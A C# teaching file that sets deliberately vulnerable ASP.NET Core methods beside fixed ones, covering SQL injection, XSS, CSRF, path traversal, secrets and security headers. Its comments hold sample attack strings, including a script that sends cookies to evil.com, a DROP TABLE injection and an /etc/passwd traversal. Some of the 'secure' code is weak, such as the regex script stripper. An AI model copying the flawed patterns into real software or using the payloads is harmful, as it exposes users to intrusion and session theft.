// ==============================================================================
// SECURE CODING PRACTICES - Application Security
// ==============================================================================
// PURPOSE:
//   Demonstrate secure coding practices to prevent common vulnerabilities
//   like SQL injection, XSS, CSRF, and other OWASP Top 10 issues.
//
// WHY SECURE CODING:
//   - Prevent data breaches
//   - Protect users
//   - Comply with regulations
//   - Avoid reputation damage
//   - Prevent financial loss
//
// WHAT YOU'LL LEARN:
//   1. SQL injection prevention
//   2. Cross-Site Scripting (XSS) prevention
//   3. Cross-Site Request Forgery (CSRF) prevention
//   4. Input validation and sanitization
//   5. Secure file uploads
//   6. Secrets management
//   7. HTTPS enforcement
//   8. Security headers
//
// OWASP TOP 10 (2021):
//   1. Broken Access Control
//   2. Cryptographic Failures
//   3. Injection
//   4. Insecure Design
//   5. Security Misconfiguration
//   6. Vulnerable Components
//   7. Authentication Failures
//   8. Data Integrity Failures
//   9. Logging Failures
//   10. Server-Side Request Forgery
//
// ==============================================================================

using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.ComponentModel.DataAnnotations;
using System.Security;
using System.Text.RegularExpressions;
using System.Web;

namespace RevisionNotesDemo.Security;

/// <summary>
/// EXAMPLE 1: SQL INJECTION PREVENTION
/// 
/// THE PROBLEM:
/// Attackers inject malicious SQL through user input.
/// Can read/modify/delete data, bypass authentication.
/// 
/// EXAMPLE ATTACK:
/// Username: admin'--
/// Password: anything
/// Query: SELECT * FROM Users WHERE Username='admin'--' AND Password='xxx'
/// Result: '--' comments out password check, logs in as admin!
/// 
/// THE SOLUTION:
/// NEVER concatenate user input into SQL.
/// Use parameterized queries or ORMs.
/// 
/// WHY IT MATTERS:
/// - #1 cause of data breaches historically
/// - Extremely dangerous (full database access)
/// - Easy to exploit
/// - Easy to prevent!
/// 
/// OWASP: Injection - #A03:2021
/// </summary>
public class SqlInjectionPrevention
{
    private readonly DbContext _context;
    
    public SqlInjectionPrevention(DbContext context)
    {
        _context = context;
    }
    
    // ❌ DANGER: SQL injection vulnerable!
    public List<User> BadGetUsers(string searchTerm)
    {
        // NEVER DO THIS!
        var sql = $"SELECT * FROM Users WHERE Name LIKE '%{searchTerm}%'";
        return _context.Database.SqlQueryRaw<User>(sql).ToList();
        
        // Attack: searchTerm = "'; DROP TABLE Users;--"
        // Result: Users table deleted!
    }
    
    // ✅ GOOD: Parameterized query
    public List<User> GoodGetUsers(string searchTerm)
    {
        // Parameters are sanitized by database driver
        var sql = "SELECT * FROM Users WHERE Name LIKE '%' + @p0 + '%'";
        return _context.Database
            .SqlQueryRaw<User>(sql, searchTerm)
            .ToList();
    }
    
    // ✅ BEST: Use ORM (Entity Framework)
    public List<User> BestGetUsers(string searchTerm)
    {
        // EF Core automatically uses parameters
        return _context.Set<User>()
            .Where(u => u.Name.Contains(searchTerm))
            .ToList();
    }
    
    // ✅ GOOD: Stored procedures (parameterized)
    public List<User> UseStoredProc(string searchTerm)
    {
        return _context.Database
            .SqlQuery<User>($"EXEC SearchUsers {searchTerm}")
            .ToList();
    }
}

/// <summary>
/// EXAMPLE 2: CROSS-SITE SCRIPTING (XSS) PREVENTION
/// 
/// THE PROBLEM:
/// Attackers inject malicious JavaScript through user input.
/// Script executes in victims' browsers, steals cookies, sessions, data.
/// 
/// EXAMPLE ATTACK:
/// Comment: <script>fetch('evil.com?cookie='+document.cookie)</script>
/// When victim views comment, their session cookie is sent to attacker!
/// 
/// THE SOLUTION:
/// - HTML encode all user output
/// - Use Content Security Policy (CSP)
/// - Sanitize HTML input
/// - HttpOnly cookies
/// 
/// WHY IT MATTERS:
/// - Steal session tokens
/// - Deface website
/// - Redirect to phishing
/// - Keylog credentials
/// 
/// OWASP: Injection - #A03:2021
/// </summary>
public static class XssPrevention
{
    // ❌ DANGER: XSS vulnerable!
    public static string BadDisplayComment(string userComment)
    {
        // NEVER output user input directly!
        return $"<div>{userComment}</div>";
        
        // Attack: userComment = "<script>alert('XSS')</script>"
        // Result: Script executes!
    }
    
    // ✅ GOOD: HTML encode output
    public static string GoodDisplayComment(string userComment)
    {
        // Razor views do this automatically with @Model.Comment
        return $"<div>{HttpUtility.HtmlEncode(userComment)}</div>";
        
        // Attack: userComment = "<script>alert('XSS')</script>"
        // Result: &lt;script&gt;alert('XSS')&lt;/script&gt; (displayed as text, not executed)
    }
    
    // ✅ GOOD: Content Security Policy header
    public static void ConfigureCSP(WebApplicationBuilder builder)
    {
        builder.Services.AddAntiforgery();
        
        // In middleware:
        // context.Response.Headers["Content-Security-Policy"] =
        //     "default-src 'self'; script-src 'self'; style-src 'self'";
    }
    
    // ✅ GOOD: HttpOnly cookies (JavaScript can't access)
    public static void SetSecureCookie(HttpContext context)
    {
        context.Response.Cookies.Append("SessionId", "value", new CookieOptions
        {
            HttpOnly = true,  // ✅ Prevents JavaScript access
            Secure = true,    // ✅ HTTPS only
            SameSite = SameSiteMode.Strict // ✅ CSRF protection
        });
    }
    
    // ❌ BAD: Trusting user HTML
    public static string BadRenderUserHtml(string userHtml)
    {
        // Dangerous if userHtml contains script tags!
        return userHtml;
    }
    
    // ✅ GOOD: Sanitize HTML (if HTML input needed)
    public static string SanitizeHtml(string userHtml)
    {
        // Use library like HtmlSanitizer
        // Remove script tags, event handlers, etc.
        return Regex.Replace(userHtml, @"<script.*?</script>", "", RegexOptions.IgnoreCase);
        // Note: Use proper sanitization library in production!
    }
}

/// <summary>
/// EXAMPLE 3: CROSS-SITE REQUEST FORGERY (CSRF) PREVENTION
/// 
/// THE PROBLEM:
/// Attacker tricks authenticated user into making unwanted requests.
/// User's browser sends their auth cookie automatically.
/// 
/// EXAMPLE ATTACK:
/// Victim is logged into bank.com
/// Victim visits evil.com
/// evil.com contains: <img src="bank.com/transfer?to=attacker&amount=1000">
/// Browser sends request with victim's auth cookie!
/// 
/// THE SOLUTION:
/// - Anti-forgery tokens (unique per request/session)
/// - SameSite cookies
/// - Check Referer/Origin headers
/// 
/// WHY IT MATTERS:
/// - Unauthorized actions
/// - Financial loss
/// - Data modification
/// - Account takeover
/// 
/// OWASP: Security Misconfiguration - #A05:2021
/// </summary>
public static class CsrfPrevention
{
    // ✅ GOOD: Enable anti-forgery tokens
    public static void ConfigureAntiforgery(WebApplicationBuilder builder)
    {
        builder.Services.AddAntiforgery(options =>
        {
            options.HeaderName = "X-CSRF-TOKEN";
            options.Cookie.Name = "CSRF-TOKEN";
            options.Cookie.HttpOnly = true;
            options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
            options.Cookie.SameSite = SameSiteMode.Strict;
        });
    }
    
    // ✅ GOOD: Validate anti-forgery token in controller
    [HttpPost]
    [ValidateAntiForgeryToken]
    public static IActionResult TransferMoney(TransferRequest request)
    {
        // Token validated automatically
        // Unauthorized CSRF requests blocked!
        return new OkResult();
    }
    
    // ✅ GOOD: SameSite cookie attribute
    public static void UseSameSiteCookies(HttpContext context)
    {
        context.Response.Cookies.Append("auth", "value", new CookieOptions
        {
            SameSite = SameSiteMode.Strict // Browser won't send with cross-site requests
        });
    }
    
    // ✅ GOOD: Check Origin header for APIs
    public static async Task<IResult> CheckOrigin(HttpContext context)
    {
        var origin = context.Request.Headers["Origin"].ToString();
        var allowedOrigins = new[] { "https://myapp.com", "https://www.myapp.com" };
        
        if (!allowedOrigins.Contains(origin))
        {
            return Results.Forbid();
        }
        
        // Process request
        return Results.Ok();
    }
}

/// <summary>
/// EXAMPLE 4: INPUT VALIDATION & SANITIZATION
/// 
/// THE PROBLEM:
/// Accepting invalid/malicious input causes errors, exploits.
/// "Garbage in, garbage out"
/// 
/// THE SOLUTION:
/// - Validate all input (whitelist, not blacklist)
/// - Sanitize before use
/// - Use Data Annotations
/// - Validate on both client and server
/// 
/// WHY IT MATTERS:
/// - Prevent injection attacks
/// - Data integrity
/// - Business rule enforcement
/// - Better error messages
/// 
/// PRINCIPLE: Never trust user input!
/// </summary>
public class InputValidationExamples
{
    // ✅ GOOD: Data Annotations validation
    public class CreateUserDto
    {
        [Required(ErrorMessage = "Email is required")]
        [EmailAddress(ErrorMessage = "Invalid email format")]
        [MaxLength(100)]
        public string Email { get; set; } = string.Empty;
        
        [Required]
        [StringLength(100, MinimumLength = 8, ErrorMessage = "Password must be 8-100 characters")]
        [RegularExpression(@"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]",
            ErrorMessage = "Password must contain uppercase, lowercase, number, and special character")]
        public string Password { get; set; } = string.Empty;
        
        [Range(18, 120, ErrorMessage = "Age must be between 18 and 120")]
        public int Age { get; set; }
        
        [Phone(ErrorMessage = "Invalid phone number")]
        public string? PhoneNumber { get; set; }
        
        [Url(ErrorMessage = "Invalid URL")]
        public string? Website { get; set; }
    }
    
    // ✅ GOOD: Manual validation with whitelist
    public static bool IsValidUsername(string username)
    {
        // Whitelist: only allows alphanumeric and underscore
        return Regex.IsMatch(username, @"^[a-zA-Z0-9_]{3,20}$");
    }
    
    // ❌ BAD: Blacklist approach (always incomplete)
    public static bool BadIsValidUsername(string username)
    {
        // NEVER do this - impossibleto list all bad characters!
        return !username.Contains("<") && !username.Contains(">") && ! username.Contains("'");
        // What about other special chars? SQL keywords? Unicode tricks?
    }
    
    // ✅ GOOD: Sanitize file names
    public static string SanitizeFileName(string fileName)
    {
        // Remove path traversal attacks
        fileName = Path.GetFileName(fileName); // Removes ../ attacks
        
        // Remove invalid characters
        return string.Join("_", fileName.Split(Path.GetInvalidFileNameChars()));
    }
    
    // ❌ DANGER: Path traversal vulnerable
    public static string BadGetFile(string fileName)
    {
        // NEVER trust user file paths!
        return File.ReadAllText($"uploads/{fileName}");
        
        // Attack: fileName = "../../etc/passwd"
        // Result: Reads sensitive system files!
    }
    
    // ✅ GOOD: Validate and sanitize file path
    public static string GoodGetFile(string fileName)
    {
        fileName = SanitizeFileName(fileName);
        var fullPath = Path.GetFullPath(Path.Combine("uploads", fileName));
        var uploadsPath = Path.GetFullPath("uploads");
        
        // Ensure file is within uploads directory
        if (!fullPath.StartsWith(uploadsPath))
        {
            throw new SecurityException("Invalid file path");
        }
        
        return File.ReadAllText(fullPath);
    }
}

/// <summary>
/// EXAMPLE 5: SECRETS MANAGEMENT
/// 
/// THE PROBLEM:
/// Hardcoded secrets in code, committed to Git.
/// API keys, passwords, connection strings exposed.
/// 
/// THE SOLUTION:
/// - Use User Secrets (development)
/// - Use Azure Key Vault (production)
/// - Use environment variables
/// - Never commit secrets to source control
/// 
/// WHY IT MATTERS:
/// - Leaked secrets = full system compromise
/// - Hard to rotate/revoke
/// - Compliance violations
/// - Public exposure via Git history
/// </summary>
public static class SecretsManagement
{
    // ❌ DANGER: Hardcoded secrets
    public static void BadConfiguration()
    {
        var connectionString = "Server=prod;Database=mydb;User=admin;Password=P@ssw0rd123;";
        // NEVER DO THIS!
        // Now in Git history forever!
    }
    
    // ✅ GOOD: Load from configuration
    public static void GoodConfiguration(IConfiguration config)
    {
        var connectionString = config.GetConnectionString("DefaultConnection");
        var apiKey = config["ApiKeys:ThirdPartyService"];
        
        // Development: User Secrets (dotnet user-secrets set "ApiKeys:MyKey" "value")
        // Production: Environment variables or Azure Key Vault
    }
    
    // ✅ GOOD: Azure Key Vault configuration
    public static void ConfigureKeyVault(WebApplicationBuilder builder)
    {
        // builder.Configuration.AddAzureKeyVault(
        //     new Uri($"https://{keyVaultName}.vault.azure.net/"),
        //     new DefaultAzureCredential());
    }
    
    // ✅ GOOD: Check for leaked secrets in .gitignore
    // Add to .gitignore:
    // appsettings.Development.json (if contains secrets)
    // .env
    // **/appsettings.*.json
}

/// <summary>
/// EXAMPLE 6: SECURITY HEADERS
/// 
/// THE PROBLEM:
/// Missing security headers leave application vulnerable.
/// 
/// THE SOLUTION:
/// Add security headers to all responses.
/// 
/// KEY HEADERS:
/// - X-Content-Type-Options: nosniff
/// - X-Frame-Options: DENY
/// - X-XSS-Protection: 1; mode=block
/// - Strict-Transport-Security: max-age=31536000
/// - Content-Security-Policy
/// </summary>
public static class SecurityHeadersMiddleware
{
    public static void AddSecurityHeaders(WebApplication app)
    {
        app.Use(async (context, next) =>
        {
            // ✅ Prevent MIME sniffing
            context.Response.Headers["X-Content-Type-Options"] = "nosniff";
            
            // ✅ Prevent clickjacking
            context.Response.Headers["X-Frame-Options"] = "DENY";
            
            // ✅ Enable XSS filter (legacy browsers)
            context.Response.Headers["X-XSS-Protection"] = "1; mode=block";
            
            // ✅ Enforce HTTPS
            context.Response.Headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains";
            
            // ✅ Content Security Policy
            context.Response.Headers["Content-Security-Policy"] =
                "default-src 'self'; script-src 'self'; style-src 'self'  'unsafe-inline';";
            
            // ✅ Referrer policy
            context.Response.Headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
            
            // ✅ Permissions policy
            context.Response.Headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()";
            
            await next();
        });
    }
}

public record User(int Id, string Name, string Email);
public record TransferRequest(string To, decimal Amount);
